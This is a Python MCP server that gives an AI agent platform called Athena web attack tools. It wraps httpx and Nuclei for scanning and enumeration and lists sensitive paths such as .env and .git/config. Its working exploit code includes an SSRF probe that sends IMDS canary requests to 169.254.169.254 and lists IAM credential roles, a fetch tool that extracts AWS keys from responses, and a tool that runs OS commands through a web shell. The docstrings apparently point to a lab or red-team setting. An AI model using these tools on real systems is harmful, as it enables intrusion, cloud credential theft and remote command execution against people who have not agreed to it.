"""web-scanner MCP Server for Athena.

Exposes HTTP probing, vulnerability scanning, directory enumeration,
and screenshotting as MCP tools. Wraps httpx-toolkit and Nuclei.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import logging
import os
import re
import shutil
import urllib.parse
from pathlib import Path

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

logger = logging.getLogger(__name__)

# Allow Docker internal network hostnames (mcp-web-scanner, etc.)
_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-web-scanner", transport_security=_security)

# ---------------------------------------------------------------------------
# Configuration from environment
# ---------------------------------------------------------------------------
SCAN_RATE_LIMIT = int(os.environ.get("SCAN_RATE_LIMIT", "100"))
SCAN_TIMEOUT_SEC = int(os.environ.get("SCAN_TIMEOUT_SEC", "300"))
NUCLEI_TEMPLATES_DIR = os.environ.get("NUCLEI_TEMPLATES_DIR", "/opt/nuclei-templates")

_DEFAULT_HTTP_PORTS = [80, 443, 8080, 8443]
_DEFAULT_VULN_TEMPLATES = ["owasp-top-10"]
_DEFAULT_EXTENSIONS = ["php", "html", "js", "txt", "bak"]

_WORDLIST_MAP = {
    "common": "/opt/wordlists/common.txt",
    "small": "/opt/wordlists/small.txt",
    "large": "/opt/wordlists/large.txt",
}

_SENSITIVE_PATTERNS = [
    ".git/", ".git/config", ".env", ".bak", ".old", ".orig",
    ".sql", ".dump", ".tar", ".gz", ".zip",
    "wp-config.php", "config.php", "config.inc.php",
    ".htpasswd", ".htaccess", "web.config",
    "backup", "admin", "phpmyadmin",
    ".DS_Store", "Thumbs.db",
    ".svn/", ".hg/",
]

# Nuclei tag → Athena fact trait mapping
_VULN_TAG_MAP: dict[str, str] = {
    "sqli": "web.vuln.sqli",
    "sql-injection": "web.vuln.sqli",
    "xss": "web.vuln.xss",
    "cross-site-scripting": "web.vuln.xss",
    "ssrf": "web.vuln.ssrf",
    "lfi": "web.vuln.path_traversal",
    "rfi": "web.vuln.path_traversal",
    "path-traversal": "web.vuln.path_traversal",
    "rce": "web.vuln.rce",
    "command-injection": "web.vuln.rce",
    "auth-bypass": "web.vuln.auth_bypass",
    "misconfig": "web.vuln.misconfig",
    "exposure": "web.vuln.exposure",
    "deserialization": "web.vuln.deserialization",
}


def _make_error(error_type: str, message: str) -> str:
    """Return a structured JSON error response."""
    return json.dumps({
        "facts": [],
        "raw_output": "",
        "error": {"type": error_type, "message": message},
    })


def _map_nuclei_tags_to_trait(tags: list[str]) -> str:
    """Map Nuclei template tags to an Athena fact trait."""
    for tag in tags:
        tag_lower = tag.lower().strip()
        if tag_lower in _VULN_TAG_MAP:
            return _VULN_TAG_MAP[tag_lower]
    return "web.vuln.generic"


def _is_sensitive_path(path: str) -> bool:
    """Check if a discovered path matches sensitive patterns."""
    path_lower = path.lower()
    return any(pattern in path_lower for pattern in _SENSITIVE_PATTERNS)


async def _run_command(
    cmd: list[str], timeout: int | None = None
) -> tuple[str, str, int]:
    """Run a command via asyncio subprocess. Returns (stdout, stderr, returncode)."""
    effective_timeout = timeout or SCAN_TIMEOUT_SEC
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=effective_timeout
        )
        return (
            stdout.decode(errors="replace"),
            stderr.decode(errors="replace"),
            proc.returncode or 0,
        )
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except Exception:
            pass
        raise


# ---------------------------------------------------------------------------
# Tool 1: HTTP Probe
# ---------------------------------------------------------------------------

@mcp.tool()
async def web_http_probe(target: str, ports: list[int] | None = None) -> str:
    """HTTP probe + tech fingerprinting + WAF detection for a target.

    Args:
        target: IP address, hostname, or URL to probe.
        ports: List of ports to probe. Defaults to [80, 443, 8080, 8443].

    Returns:
        JSON string with Athena-compatible facts:
        - web.http.service: "{url}|{status}|{title}|{server}"
        - web.http.technology: "{url}|{tech}"
        - web.http.waf: "{url}|{waf_name}"
    """
    if not shutil.which("httpx"):
        return _make_error("DEPENDENCY_ERROR", "httpx binary not found in PATH")

    effective_ports = ports or _DEFAULT_HTTP_PORTS
    ports_str = ",".join(str(p) for p in effective_ports)

    cmd = [
        "httpx",
        "-target", target,
        "-ports", ports_str,
        "-json",
        "-tech-detect",
        "-status-code",
        "-title",
        "-web-server",
        "-follow-redirects",
        "-silent",
    ]

    try:
        stdout, stderr, returncode = await _run_command(cmd)
    except asyncio.TimeoutError:
        return _make_error("TIMEOUT", f"httpx probe timed out after {SCAN_TIMEOUT_SEC}s")
    except Exception as exc:
        return _make_error("CONNECTION_ERROR", f"Failed to run httpx: {exc}")

    facts: list[dict[str, str]] = []
    lines = [line.strip() for line in stdout.strip().split("\n") if line.strip()]

    for line in lines:
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue

        url = data.get("url", data.get("input", target))
        status = data.get("status_code", data.get("status-code", 0))
        title = data.get("title", "")
        server = data.get("webserver", data.get("web-server", ""))

        # HTTP service fact
        facts.append({
            "trait": "web.http.service",
            "value": f"{url}|{status}|{title}|{server}",
        })

        # Technology facts
        techs = data.get("tech", data.get("technologies", []))
        if isinstance(techs, list):
            for tech in techs:
                facts.append({
                    "trait": "web.http.technology",
                    "value": f"{url}|{tech}",
                })

        # WAF detection
        waf = data.get("waf", data.get("waf_name", ""))
        if waf:
            facts.append({
                "trait": "web.http.waf",
                "value": f"{url}|{waf}",
            })

    return json.dumps({
        "facts": facts,
        "raw_output": stdout[:2000],
    })


# ---------------------------------------------------------------------------
# Tool 2: Vulnerability Scan
# ---------------------------------------------------------------------------

@mcp.tool()
async def web_vuln_scan(
    url: str,
    templates: list[str] | None = None,
    severity: str = "high",
) -> str:
    """OWASP Top 10 vulnerability scanning via Nuclei.

    Args:
        url: Target URL to scan (e.g. http://example.com).
        templates: Nuclei template tags to use. Defaults to ["owasp-top-10"].
        severity: Minimum severity filter. Defaults to "high".

    Returns:
        JSON string with Athena-compatible facts:
        - web.vuln.<category>: "{url}|{template_id}|{severity}|{name}|{description}"
    """
    if not shutil.which("nuclei"):
        return _make_error("DEPENDENCY_ERROR", "nuclei binary not found in PATH")

    effective_templates = templates or _DEFAULT_VULN_TEMPLATES
    tags_str = ",".join(effective_templates)
    severity_str = f"{severity},critical" if severity != "critical" else "critical"

    cmd = [
        "nuclei",
        "-u", url,
        "-tags", tags_str,
        "-severity", severity_str,
        "-json",
        "-silent",
        "-rate-limit", str(SCAN_RATE_LIMIT),
        "-timeout", str(SCAN_TIMEOUT_SEC),
    ]

    # Add templates directory if it exists
    templates_dir = Path(NUCLEI_TEMPLATES_DIR)
    if templates_dir.is_dir():
        cmd.extend(["-ud", str(templates_dir)])

    try:
        stdout, stderr, returncode = await _run_command(cmd)
    except asyncio.TimeoutError:
        return _make_error("TIMEOUT", f"nuclei scan timed out after {SCAN_TIMEOUT_SEC}s")
    except Exception as exc:
        return _make_error("CONNECTION_ERROR", f"Failed to run nuclei: {exc}")

    # Check for template errors
    if "could not find template" in stderr.lower() or "no templates found" in stderr.lower():
        return _make_error("TEMPLATE_ERROR", f"Nuclei template error: {stderr[:500]}")

    facts: list[dict[str, str]] = []
    lines = [line.strip() for line in stdout.strip().split("\n") if line.strip()]

    for line in lines:
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue

        template_id = data.get("template-id", data.get("templateID", "unknown"))
        vuln_name = data.get("info", {}).get("name", data.get("name", ""))
        vuln_severity = data.get("info", {}).get("severity", data.get("severity", "unknown"))
        vuln_desc = data.get("info", {}).get("description", "")
        matched_url = data.get("matched-at", data.get("matched", url))
        tags = data.get("info", {}).get("tags", data.get("tags", []))

        if isinstance(tags, str):
            tags = [t.strip() for t in tags.split(",")]

        trait = _map_nuclei_tags_to_trait(tags)

        facts.append({
            "trait": trait,
            "value": f"{matched_url}|{template_id}|{vuln_severity}|{vuln_name}|{vuln_desc[:200]}",
        })

    return json.dumps({
        "facts": facts,
        "raw_output": stdout[:2000],
    })


# ---------------------------------------------------------------------------
# Tool 3: Directory Enumeration
# ---------------------------------------------------------------------------

@mcp.tool()
async def web_dir_enum(
    url: str,
    wordlist: str = "common",
    extensions: list[str] | None = None,
) -> str:
    """Directory and file enumeration via httpx.

    Args:
        url: Base URL to enumerate (e.g. http://example.com).
        wordlist: Wordlist size: "common", "small", or "large".
        extensions: File extensions to test. Defaults to ["php", "html", "js", "txt", "bak"].

    Returns:
        JSON string with Athena-compatible facts:
        - web.dir.found: "{full_url}|{status_code}"
        - web.dir.sensitive: "{full_url}|{status_code}|{pattern}"
    """
    if not shutil.which("httpx"):
        return _make_error("DEPENDENCY_ERROR", "httpx binary not found in PATH")

    wordlist_path = _WORDLIST_MAP.get(wordlist)
    if wordlist_path is None:
        return _make_error(
            "INVALID_WORDLIST",
            f"Unknown wordlist '{wordlist}'. Valid options: {', '.join(_WORDLIST_MAP.keys())}",
        )

    if not Path(wordlist_path).exists():
        return _make_error(
            "INVALID_WORDLIST",
            f"Wordlist file not found: {wordlist_path}",
        )

    effective_extensions = extensions or _DEFAULT_EXTENSIONS

    # Read wordlist and build URL list
    base_url = url.rstrip("/")
    try:
        with open(wordlist_path, "r") as f:
            words = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except Exception as exc:
        return _make_error("INVALID_WORDLIST", f"Failed to read wordlist: {exc}")

    # Build target URLs: base paths + extensions
    target_urls: list[str] = []
    for word in words:
        target_urls.append(f"{base_url}/{word}")
        for ext in effective_extensions:
            target_urls.append(f"{base_url}/{word}.{ext}")

    # Write targets to temp file for httpx
    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False, prefix="athena_dir_"
    ) as tf:
        tf.write("\n".join(target_urls))
        targets_file = tf.name

    try:
        cmd = [
            "httpx",
            "-l", targets_file,
            "-json",
            "-status-code",
            "-silent",
            "-follow-redirects",
            "-mc", "200,201,202,204,301,302,307,308,403",
        ]

        try:
            stdout, stderr, returncode = await _run_command(cmd)
        except asyncio.TimeoutError:
            return _make_error("TIMEOUT", f"Directory enumeration timed out after {SCAN_TIMEOUT_SEC}s")
        except Exception as exc:
            return _make_error("CONNECTION_ERROR", f"Failed to run httpx: {exc}")
    finally:
        try:
            os.unlink(targets_file)
        except OSError:
            pass

    facts: list[dict[str, str]] = []
    sensitive_facts: list[dict[str, str]] = []
    lines = [line.strip() for line in stdout.strip().split("\n") if line.strip()]

    for line in lines:
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue

        found_url = data.get("url", data.get("input", ""))
        status = data.get("status_code", data.get("status-code", 0))

        if not found_url:
            continue

        # Determine path relative to base URL for sensitivity check
        rel_path = found_url.replace(base_url, "", 1)

        if _is_sensitive_path(rel_path):
            # Identify which pattern matched
            matched_pattern = ""
            for pattern in _SENSITIVE_PATTERNS:
                if pattern in rel_path.lower():
                    matched_pattern = pattern
                    break
            sensitive_facts.append({
                "trait": "web.dir.sensitive",
                "value": f"{found_url}|{status}|{matched_pattern}",
            })
        else:
            facts.append({
                "trait": "web.dir.found",
                "value": f"{found_url}|{status}",
            })

    # Prioritize sensitive paths, then regular, truncate at 500
    max_results = 500
    combined = sensitive_facts[:max_results]
    remaining = max_results - len(combined)
    if remaining > 0:
        combined.extend(facts[:remaining])

    return json.dumps({
        "facts": combined,
        "raw_output": stdout[:2000],
    })


# ---------------------------------------------------------------------------
# Tool 4: Screenshot
# ---------------------------------------------------------------------------

@mcp.tool()
async def web_screenshot(url: str) -> str:
    """Take a screenshot of a web page via httpx screenshot mode.

    Falls back to recording page title if no Chrome/Chromium binary is available.

    Args:
        url: URL to screenshot.

    Returns:
        JSON string with Athena-compatible facts:
        - web.screenshot: "{url}|{screenshot_path_or_title}"
    """
    if not shutil.which("httpx"):
        return _make_error("DEPENDENCY_ERROR", "httpx binary not found in PATH")

    # Check if Chrome/Chromium is available for screenshot mode
    has_chrome = (
        shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("google-chrome")
        or shutil.which("google-chrome-stable")
    )

    if has_chrome:
        # Use httpx screenshot mode
        import tempfile
        screenshot_dir = tempfile.mkdtemp(prefix="athena_screenshot_")

        cmd = [
            "httpx",
            "-target", url,
            "-screenshot",
            "-screenshot-path", screenshot_dir,
            "-json",
            "-silent",
        ]

        try:
            stdout, stderr, returncode = await _run_command(cmd, timeout=60)
        except asyncio.TimeoutError:
            return _make_error("TIMEOUT", "Screenshot timed out after 60s")
        except Exception as exc:
            return _make_error("CONNECTION_ERROR", f"Screenshot failed: {exc}")

        # Find screenshot file
        screenshot_files = list(Path(screenshot_dir).glob("*.png"))
        screenshot_path = str(screenshot_files[0]) if screenshot_files else "no_screenshot"

        facts = [{
            "trait": "web.screenshot",
            "value": f"{url}|{screenshot_path}",
        }]

        return json.dumps({
            "facts": facts,
            "raw_output": stdout[:2000],
        })
    else:
        # Fallback: just get the page title
        cmd = [
            "httpx",
            "-target", url,
            "-json",
            "-title",
            "-status-code",
            "-silent",
        ]

        try:
            stdout, stderr, returncode = await _run_command(cmd, timeout=30)
        except asyncio.TimeoutError:
            return _make_error("TIMEOUT", "Title probe timed out after 30s")
        except Exception as exc:
            return _make_error("CONNECTION_ERROR", f"Title probe failed: {exc}")

        title = ""
        lines = [line.strip() for line in stdout.strip().split("\n") if line.strip()]
        for line in lines:
            try:
                data = json.loads(line)
                title = data.get("title", "")
                break
            except json.JSONDecodeError:
                continue

        if not title and not lines:
            return _make_error("CONNECTION_ERROR", f"Could not reach {url}")

        facts = [{
            "trait": "web.screenshot",
            "value": f"{url}|title:{title}",
        }]

        return json.dumps({
            "facts": facts,
            "raw_output": stdout[:2000],
        })


# ---------------------------------------------------------------------------
# Tool 5: HTTP Fetch
# ---------------------------------------------------------------------------

MAX_BODY_SIZE = 4096

_fetch_semaphore = asyncio.Semaphore(SCAN_RATE_LIMIT)


def _detect_imds_credential(body: str) -> dict | None:
    """Detect AWS IMDS credential in response body."""
    try:
        data = json.loads(body)
        if all(k in data for k in ("AccessKeyId", "SecretAccessKey", "Token")):
            return {
                "access_key_id": data["AccessKeyId"],
                "secret_access_key": data["SecretAccessKey"],
                "token": data["Token"],
                "expiration": data.get("Expiration", ""),
                "code": data.get("Code", ""),
            }
    except (json.JSONDecodeError, TypeError):
        pass
    return None


@mcp.tool()
async def web_http_fetch(
    url: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    follow_redirects: bool = True,
) -> str:
    """Send an HTTP request and return the response.

    Automatically detects AWS IMDS credentials in response bodies.

    Args:
        url: Target URL (http/https only).
        method: HTTP method (GET, POST, PUT, DELETE, etc.).
        headers: Optional request headers.
        body: Optional request body (for POST/PUT).
        follow_redirects: Whether to follow HTTP redirects.

    Returns:
        JSON string with Athena-compatible facts:
        - web.http.response: "{url}|{status}|{content_type}|{body_preview}"
        - cloud.aws.iam_credential: "{AccessKeyId}|{Expiration}" (if detected)
    """
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return _make_error(
            "INVALID_URL",
            f"Unsupported URL scheme '{parsed.scheme}'. Only http and https are allowed.",
        )

    import httpx

    async with _fetch_semaphore:
        try:
            async with httpx.AsyncClient(
                follow_redirects=follow_redirects,
                timeout=httpx.Timeout(SCAN_TIMEOUT_SEC),
            ) as client:
                response = await client.request(
                    method=method.upper(),
                    url=url,
                    headers=headers,
                    content=body.encode() if body else None,
                )
        except (httpx.TimeoutException, asyncio.TimeoutError):
            return _make_error("TIMEOUT", f"Request to {url} timed out after {SCAN_TIMEOUT_SEC}s")
        except Exception as exc:
            return _make_error("CONNECTION_ERROR", f"Request to {url} failed: {exc}")

    status = response.status_code
    content_type = response.headers.get("content-type", "")
    body_text = response.text
    body_truncated = body_text[:MAX_BODY_SIZE]
    body_preview = body_text[:100]

    facts: list[dict[str, str]] = []

    facts.append({
        "trait": "web.http.response",
        "value": f"{url}|{status}|{content_type}|{body_preview}",
    })

    credential = _detect_imds_credential(body_text)
    if credential:
        # ADR-048: Store masked secret in value for safe display,
        # full credential JSON in raw_output for programmatic use
        secret = credential['secret_access_key']
        masked_secret = f"{secret[:8]}...{secret[-4:]}" if len(secret) > 12 else "***"
        facts.append({
            "trait": "cloud.aws.iam_credential",
            "value": f"{credential['access_key_id']}|{masked_secret}|{credential['expiration']}",
            "raw_output": json.dumps(credential),
        })

    return json.dumps({
        "facts": facts,
        "raw_output": body_truncated,
    })


# ---------------------------------------------------------------------------
# Tool 6: SSRF Probe
# ---------------------------------------------------------------------------

PROXY_PATHS = [
    "/proxy/", "/redirect/", "/fetch/", "/forward/", "/url/",
    "/request/", "/ssrf/", "/load/", "/read/", "/content/",
    "/navigate/", "/open/", "/browse/", "/preview/",
]

SSRF_PARAMS = ["url", "dest", "redirect", "path", "next", "data", "load", "fetch"]

IMDS_CANARY = "169.254.169.254/latest/meta-data/"
IMDS_MARKERS = ("ami-id", "instance-id", "security-credentials")

_SSRF_PROBE_TIMEOUT = 5
_ssrf_semaphore = asyncio.Semaphore(SCAN_RATE_LIMIT)


async def _ssrf_get(
    client: "httpx.AsyncClient", url: str
) -> tuple[int, str] | None:
    """GET with semaphore + short timeout. Returns (status, body) or None."""
    async with _ssrf_semaphore:
        try:
            resp = await client.get(url)
            return resp.status_code, resp.text[:4096]
        except Exception:
            return None


def _has_imds_markers(body: str) -> bool:
    body_lower = body.lower()
    return any(m in body_lower for m in IMDS_MARKERS)


@mcp.tool()
async def web_ssrf_probe(target_url: str) -> str:
    """Probe a web application for SSRF vulnerabilities.

    Tests common path-based proxies, parameter-based SSRF patterns,
    and validates with IMDS canary requests.

    Args:
        target_url: Base URL to probe (e.g. http://example.com).

    Returns:
        JSON string with Athena-compatible facts:
        - web.vuln.ssrf: "{type}|{endpoint}|{canary_result}"
        - cloud.aws.imds_role: "{role_name}" (if IMDS role listing detected)
    """
    parsed = urllib.parse.urlparse(target_url)
    if parsed.scheme not in ("http", "https"):
        return _make_error(
            "INVALID_URL",
            f"Unsupported URL scheme '{parsed.scheme}'. Only http and https are allowed.",
        )

    import httpx

    base = target_url.rstrip("/")
    facts: list[dict[str, str]] = []
    raw_parts: list[str] = []

    async with httpx.AsyncClient(
        follow_redirects=True,
        timeout=httpx.Timeout(_SSRF_PROBE_TIMEOUT),
    ) as client:

        # ── Phase 1: Path-based proxy discovery ──
        phase1_tasks = [
            _ssrf_get(client, f"{base}{path}")
            for path in PROXY_PATHS
        ]
        phase1_results = await asyncio.gather(*phase1_tasks)

        live_paths: list[str] = []
        for path, result in zip(PROXY_PATHS, phase1_results):
            if result is None:
                continue
            status, body = result
            if status not in (404, 403, 405):
                live_paths.append(path)
                raw_parts.append(f"path_probe {path} -> {status}")

        # ── Phase 2: IMDS canary on live paths ──
        if live_paths:
            phase2_tasks = [
                _ssrf_get(client, f"{base}{path}{IMDS_CANARY}")
                for path in live_paths
            ]
            phase2_results = await asyncio.gather(*phase2_tasks)

            for path, result in zip(live_paths, phase2_results):
                endpoint = f"{base}{path}{IMDS_CANARY}"
                imds_confirmed = False

                if result is not None:
                    status, body = result
                    if _has_imds_markers(body):
                        imds_confirmed = True
                        facts.append({
                            "trait": "web.vuln.ssrf",
                            "value": f"path_proxy|{endpoint}|imds_confirmed",
                        })
                        raw_parts.append(f"IMDS confirmed via {endpoint}")

                        # Check for role listing
                        cred_path = f"{base}{path}169.254.169.254/latest/meta-data/iam/security-credentials/"
                        role_result = await _ssrf_get(client, cred_path)
                        if role_result:
                            _, role_body = role_result
                            role_name = role_body.strip().split("\n")[0].strip()
                            if role_name and re.match(r"^[\w+=,.@\-]{1,128}$", role_name):
                                facts.append({
                                    "trait": "cloud.aws.imds_role",
                                    "value": role_name,
                                })

                if not imds_confirmed:
                    # Path was live in Phase 1 but IMDS canary didn't confirm
                    facts.append({
                        "trait": "web.vuln.ssrf",
                        "value": f"path_proxy|{base}{path}|response_200",
                    })

        # ── Phase 3: Parameter-based SSRF ──
        imds_url = f"http://{IMDS_CANARY}"
        phase3_tasks = [
            _ssrf_get(client, f"{base}?{param}={imds_url}")
            for param in SSRF_PARAMS
        ]
        phase3_results = await asyncio.gather(*phase3_tasks)

        for param, result in zip(SSRF_PARAMS, phase3_results):
            if result is None:
                continue
            status, body = result
            endpoint = f"{base}?{param}={imds_url}"

            if _has_imds_markers(body):
                facts.append({
                    "trait": "web.vuln.ssrf",
                    "value": f"param_ssrf|{endpoint}|imds_confirmed",
                })
                raw_parts.append(f"IMDS confirmed via param {param}")
            elif status in (301, 302, 303, 307, 308):
                facts.append({
                    "trait": "web.vuln.ssrf",
                    "value": f"open_redirect|{endpoint}|redirect_confirmed",
                })

    return json.dumps({
        "facts": facts,
        "raw_output": "\n".join(raw_parts)[:2000],
    })


# ---------------------------------------------------------------------------
# Tool: Web RCE Execute (command injection exploitation)
# ---------------------------------------------------------------------------

@mcp.tool()
async def web_rce_execute(url: str, cmd: str = "whoami", param: str = "cmd") -> str:
    """Execute OS command via a web shell or command injection endpoint.

    Sends a GET request to `url?<param>=<cmd>` and extracts the command
    output from a <pre> block (compatible with the Contoso debug.aspx
    lab page deployed by Stage2-Web.ps1 S2-K).

    Args:
        url:   Web shell URL, e.g. http://192.168.0.20/debug.aspx
        cmd:   OS command to execute, e.g. "whoami" or "net user"
        param: Query parameter name (default: cmd)

    Returns:
        JSON with Athena facts:
        - access.web_shell: "RCE@<url>: <cmd_output>"
        - access.initial:   "web_shell:<url>"
    """
    import urllib.request as _urlreq
    import urllib.error as _urlerr
    import html as _html

    encoded_cmd = urllib.parse.quote(cmd)
    target_url = f"{url}?{urllib.parse.quote(param)}={encoded_cmd}"

    try:
        req = _urlreq.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
        with _urlreq.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
    except _urlerr.HTTPError as exc:
        return _make_error("HTTP_ERROR", f"HTTP {exc.code} from {target_url}")
    except Exception as exc:
        return _make_error("CONNECTION_ERROR", f"Failed to reach {url}: {exc}")

    # Extract output from <pre>...</pre>
    pre_match = re.search(r"<pre[^>]*>(.*?)</pre>", body, re.DOTALL | re.IGNORECASE)
    if pre_match:
        output = _html.unescape(pre_match.group(1)).strip()
    else:
        output = body[:500].strip()

    if not output:
        return _make_error("NO_OUTPUT", f"RCE endpoint {url} returned empty output")

    short_out = output[:400]
    return json.dumps({
        "facts": [
            {"trait": "access.web_shell", "value": f"RCE@{url}: {short_out}"},
            {"trait": "access.initial",   "value": f"web_shell:{url}"},
            {"trait": "service.web",      "value": url},
        ],
        "raw_output": output[:1000],
    })


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
